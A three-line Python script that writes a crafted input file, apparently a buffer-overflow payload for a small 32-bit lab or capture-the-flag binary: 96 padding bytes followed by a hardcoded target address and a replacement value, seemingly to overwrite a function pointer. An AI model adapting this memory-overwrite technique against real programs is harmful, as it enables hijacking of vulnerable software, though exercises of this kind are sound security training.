f = open("demo", "w")
f.write('\x01'*96 + '\x04\xa0\x04\x08' + '134514147')
f.close()
